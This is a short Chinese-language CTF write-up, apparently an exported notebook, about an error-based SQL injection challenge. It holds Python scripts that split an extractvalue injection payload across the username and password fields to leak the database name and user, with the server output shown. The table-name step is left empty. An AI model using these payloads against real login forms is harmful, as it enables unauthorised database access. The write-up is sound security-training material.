# sql注入之报错注入——加了料的报错注入

0x01
===
<img src="http://wujiashuaitupiancunchu.oss-cn-shanghai.aliyuncs.com/jupyter_notebook_img/5wspylsy8c8.png" width="600px" />

[题目链接](http://ctf5.shiyanbar.com/web/baocuo/index.php)

0x02 解题
===
### 获取数据库名称
code
```python
import requests

data={'username':"'or extractvalue/*",
"password":"*/(1, concat(0x5c,(select database()))) or'"}
r = requests.post("http://ctf5.shiyanbar.com/web/baocuo/index.php",data=data)
r.encoding='utf-8'
print(r.text)
```
output
```shell
<br>XPATH syntax error: '\error_based_hpf'
```
### 获取用户名称
code
```python
import requests

data={'username':"'or extractvalue/*",
"password":"*/(1, concat(0x5c,(select user()))	) or'"}
r = requests.post("http://ctf5.shiyanbar.com/web/baocuo/index.php",data=data)
r.encoding='utf-8'
print(r.text)
```
output
```shell
<br>XPATH syntax error: '\web8@localhost'

```

### 获取数据表名称


```{.python .input}

```
